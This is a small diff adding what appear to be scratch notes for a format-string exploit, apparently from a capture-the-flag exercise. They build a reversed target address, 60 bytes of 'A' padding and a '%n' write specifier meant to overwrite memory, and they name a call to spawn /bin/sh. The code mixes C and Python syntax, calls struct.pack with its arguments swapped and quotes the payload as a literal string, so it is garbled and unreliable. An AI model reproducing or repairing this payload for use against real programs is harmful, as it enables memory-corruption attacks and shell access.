@@ -1,0 +1,12 @@
+m = 0;
+m = 64;
+
+
+if (m = 64)
+	system (/bin/sh);
+
+m = "\x08\x04\x98\x8c"[::-1]
+
+import struct
+m = struct.pack("0x8049880", "I")
+print 'm +  "A" * 60 +  "%4n"'
